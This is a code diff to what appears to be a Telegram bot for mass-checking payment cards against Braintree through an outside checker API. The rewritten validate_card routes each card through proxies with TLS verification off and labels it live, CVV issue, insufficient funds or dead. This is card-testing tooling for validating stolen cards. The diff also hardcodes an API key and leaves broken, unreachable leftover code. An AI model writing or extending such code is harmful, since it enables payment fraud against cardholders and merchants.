@@ -133,7 +133,7 @@ COOLDOWN_CHECK = 3  # Faster - reduced from 5
 COOLDOWN_MASS = 5   # Faster - reduced from 10
 MAX_MASS_CARDS = 15  # Increased from 10
 MAX_FILE_CARDS = 500
-MAX_WORKERS = 10  # Increased from 20 for faster parallel processing
+MAX_WORKERS = 5  # Increased from 20 for faster parallel processing
 HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"
 
 def get_card_info(card_number):
@@ -293,14 +293,69 @@ class BraintreeChecker:
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         })
         
+    
     def validate_card(self, card):
-        """Validate card with OPTIMIZED speed and error handling"""
         start_time = time.time()
-        
+
         try:
-            parts = card.replace(' ', '').split('|')
-            if len(parts) != 4:
-                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌', 'time': 0}
+            number, exp_month, exp_year, cvv = card.split('|')
+            card_info = get_card_info(number)
+
+            params = {
+                'lista': card,
+                'proxy': '',
+                'sites': get_braintree_site(self.chat_id),
+                'xlite': 'undefined'
+            }
+
+            response = None
+
+            for attempt in range(2):
+                try:
+                    response = self.session.get(
+                        JOSS_API,
+                        params=params,
+                        proxies=get_proxies() if ACTIVE_PROXY else None,
+                        verify=False,
+                        timeout=25
+                    )
+
+                    if response.status_code == 200:
+                        break
+
+                except requests.exceptions.Timeout:
+                    if attempt == 1:
+                        raise
+                    time.sleep(1)
+                except Exception:
+                    if attempt == 1:
+                        raise
+                    time.sleep(1)
+
+            elapsed_time = round(time.time() - start_time, 2)
+
+            if not response:
+                raise Exception("No response")
+
+            text = response.text.lower()
+
+            if 'approved' in text or 'success' in text:
+                return {'status': 'live', 'message': 'Approved', 'icon': '✅', 'card_info': card_info, 'time': elapsed_time}
+
+            if 'cvv' in text:
+                return {'status': 'live_cvv', 'message': 'CVV issue', 'icon': '⚠️', 'card_info': card_info, 'time': elapsed_time}
+
+            if 'insufficient' in text:
+                return {'status': 'insufficient', 'message': 'Insufficient funds', 'icon': '💰', 'card_info': card_info, 'time': elapsed_time}
+
+            return {'status': 'dead', 'message': 'Declined', 'icon': '❌', 'card_info': card_info, 'time': elapsed_time}
+
+        except requests.exceptions.Timeout:
+            return {'status': 'error', 'message': 'Timeout (API slow)', 'icon': '❌', 'time': 0}
+
+        except Exception:
+            return {'status': 'error', 'message': 'API error', 'icon': '❌', 'time': 0}
+
             
             number, exp_month, exp_year, cvv = parts
             
